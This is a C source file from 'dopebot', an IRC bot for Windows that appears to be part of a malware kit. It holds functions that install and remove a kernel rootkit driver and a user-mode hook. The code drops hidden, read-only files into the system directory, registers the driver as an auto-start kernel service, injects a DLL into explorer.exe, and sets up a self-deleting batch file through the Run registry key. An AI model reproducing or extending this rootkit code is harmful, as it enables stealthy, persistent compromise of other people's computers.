/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "bot.h"

#ifndef NO_KERNELKIT
//Install The Kernel Rootkit
bool install_kernelkit()
{
	char szInstallPath[MAX_PATH], szSysDir[MAX_PATH];
	if (is_os9x()) return FALSE;
	if (!is_osnt()) return FALSE;

#ifndef NO_DEBUG
		printf("[DEBUG] Installing kernel kit, install_kernelkit()\n");
#endif

		GetSystemDirectory(szSysDir, sizeof(szSysDir));
		sprintf(szInstallPath, "%s\\%s", szSysDir, driverfilename);
	if (!file_exists(szInstallPath)) extract_resource("driver", "RT_RCDATA", szInstallPath);
		SetFileAttributes(szInstallPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

#ifndef NO_SERVICE
	if (install_service(drivername, szInstallPath, SERVICE_KERNEL_DRIVER, SERVICE_AUTO_START, TRUE)) return TRUE;
#endif

		return FALSE;
}

//Uninstall The Kernel Rootkit
bool uninstall_kernelkit()
{
	char szInstallPath[MAX_PATH], szSysDir[MAX_PATH];

#ifndef NO_DEBUG
		printf("[DEBUG] Unnstalling kernel kit, uninstall_kernelkit()\n");
#endif

		GetSystemDirectory(szSysDir, sizeof(szSysDir));
		sprintf(szInstallPath, "%s\\%s", szSysDir, driverfilename);
	if (!uninstall_service(drivername)) return FALSE;
	if (!delete_file(szInstallPath)) return FALSE;
		return TRUE;
}
#endif

#ifndef NO_USERKIT
//Install The User Hook
bool install_userkit()
{
	char szInstallPath[MAX_PATH], szSysDir[MAX_PATH];

#ifndef NO_DEBUG
		printf("[DEBUG] Installing user kit, install_userkit()\n");
#endif	

		GetSystemDirectory(szSysDir, sizeof(szSysDir));
		sprintf(szInstallPath, "%s\\%s", szSysDir, hookfilename);
	if (!file_exists(szInstallPath)) extract_resource("hooker", "RT_RCDATA", szInstallPath);
		SetFileAttributes(szInstallPath, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);

#ifndef NO_INJECTION
	if (inject_library("explorer.exe", szInstallPath)) return TRUE;
#endif

	return FALSE;
}

//Uninstall The User Hook
bool uninstall_userkit()
{
	char szBatPath[MAX_PATH], szInstallPath[MAX_PATH], szMeltText[IRCBUF], szSysDir[MAX_PATH], szTempDir[MAX_PATH];
	DWORD r;
	HANDLE hFile;

#ifndef NO_DEBUG
		printf("[DEBUG] Uninstalling user kit, uninstall_userkit()\n");
#endif	

		GetSystemDirectory(szSysDir, sizeof(szSysDir));
		sprintf(szInstallPath, "%s\\%s", szSysDir, hookfilename);
		GetTempPath(sizeof(szTempDir), szTempDir);
		sprintf(szBatPath, "%stmp.bat", szTempDir);
		sprintf(szMeltText,
				"@echo off\r\n"
				":start\r\n"
				"attrib \"%s\" -R -A -S -H\r\n"
				"del \"%s\"\r\n"
				"if exist \"%s\" goto start\r\n"
				"del \"%s\"",
				szInstallPath, szInstallPath, szInstallPath, szBatPath);
		hFile = CreateFile(szBatPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
			CloseHandle(hFile);
			return FALSE;
	}
		WriteFile(hFile, szMeltText, strlen(szMeltText), &r, NULL);
		CloseHandle(hFile);
		regwritekey(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", regkeyname, szBatPath);
		return TRUE;
}
#endif